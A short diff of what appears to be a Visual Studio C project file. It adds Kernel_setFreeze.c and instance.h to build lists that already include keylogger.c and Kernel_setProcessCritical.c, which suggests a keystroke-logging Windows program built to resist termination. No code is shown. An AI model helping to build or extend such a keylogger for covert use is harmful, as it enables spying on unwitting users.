@@ -151,6 +151,7 @@
     <ClCompile Include="initialize.c" />
     <ClCompile Include="Kernel.c" />
     <ClCompile Include="KernelPower.c" />
+    <ClCompile Include="Kernel_setFreeze.c" />
     <ClCompile Include="Kernel_setProcessCritical.c" />
     <ClCompile Include="keylogger.c" />
     <ClCompile Include="main.c" />
@@ -174,6 +175,7 @@
     <ClInclude Include="exception.h" />
     <ClInclude Include="Information.h" />
     <ClInclude Include="initialize.h" />
+    <ClInclude Include="instance.h" />
     <ClInclude Include="Kernel.h" />
     <ClInclude Include="keylogger.h" />
     <ClInclude Include="native.h" />
